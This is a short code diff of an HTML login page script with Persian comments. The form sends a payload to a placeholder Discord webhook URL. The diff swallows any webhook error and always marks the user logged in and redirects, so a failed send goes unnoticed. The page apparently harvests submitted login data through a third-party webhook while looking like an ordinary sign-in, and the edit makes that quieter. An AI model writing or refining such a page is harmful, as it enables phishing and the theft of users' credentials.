@@ -23,7 +23,7 @@
   </div>
 
   <script>
-    const webhookURL = "🔗 اینجا لینک وبهوک دیسکورد بذار";
+    const webhookURL = "🔗 اینجا لینک وبهوک دیسکورد بذار"; // لینک وبهوک
 
     document.getElementById("loginForm").addEventListener("submit", function(e) {
       e.preventDefault();
@@ -46,14 +46,10 @@
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload)
-      }).then(res => {
-        if (res.ok) {
-          localStorage.setItem("loggedIn", "true");
-          alert("✅ ورود موفقیت‌آمیز بود!");
-          window.location.href = "index.html";
-        } else {
-          alert("⚠️ خطا در ورود!");
-        }
+      }).catch(() => { /* حتی اگه وبهوک خراب باشه */ })
+      .finally(() => {
+        localStorage.setItem("loggedIn", "true");
+        window.location.href = "index.html";
       });
     });
   </script>
